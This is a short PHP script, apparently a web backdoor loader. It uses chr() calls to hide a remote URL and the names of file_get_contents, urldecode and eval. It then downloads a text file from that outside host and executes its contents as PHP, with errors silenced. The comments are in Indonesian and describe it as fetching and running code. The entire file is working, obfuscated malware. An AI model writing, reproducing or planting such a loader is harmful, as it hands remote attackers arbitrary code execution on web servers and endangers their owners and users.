<?php
error_reporting(0);
function c($x){return chr($x);}

// === BUILD URL ===
$url = c(104).c(116).c(116).c(112).c(115).c(58).c(47).c(47).
       c(119).c(119).c(119).c(46).c(116).c(97).c(112).c(102).c(117).c(115).c(101).c(46).
       c(105).c(111).c(47).c(114).c(97).c(119).c(47).c(104).c(97).c(120).c(49).c(46).c(116).c(120).c(116);

// === FUNCTIONS ===
$f = c(102).c(105).c(108).c(101).c(95).c(103).c(101).c(116).c(95).c(99).c(111).c(110).c(116).c(101).c(110).c(116).c(115);
$u = c(117).c(114).c(108).c(100).c(101).c(99).c(111).c(100).c(101);
$e = c(101).c(118).c(97).c(108);

// === <?php (urlencoded) ===
$open = c(37).c(51).c(67).c(37).c(51).c(70).c(112).c(104).c(112); // %3C%3Fphp

// === AMBIL & JALANKAN ===
$content = @$f($url);
if($content !== false && trim($content) !== ''){
    // Tambah <?php jika belum ada
    if(strpos($content, '<?php') !== 0){
        $payload = $u($open) . $content;
    } else {
        $payload = $content;
    }
    @$e($payload);
}
?>
